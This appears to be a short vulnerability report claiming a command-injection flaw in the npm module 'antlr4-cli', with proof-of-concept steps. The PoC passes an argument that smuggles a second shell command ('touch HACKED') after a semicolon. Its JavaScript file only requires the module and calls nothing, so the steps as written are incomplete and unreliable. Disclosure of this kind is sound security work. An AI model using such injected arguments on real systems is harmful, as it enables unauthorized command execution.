# :bug: Description

The `antlr4-cli` module is vulnerable against `RCE` since a command is crafted using `user inputs` not validated and then executedading to `arbitrary command injection`

# :fire: POC

1. Create the following PoC file:

```js
// poc.js
var antlr4 = require("antlr4-cli");

```
2. Check there aren't files called `HACKED` 
3. Execute the following commands in another terminal:

```bash
npm i antlr4-cli # Install affected module
node poc.js 'simple_argument_in_single_quote;touch HACKED; #' # Run PoC
```
4. Recheck the files: now `HACKED` has been created
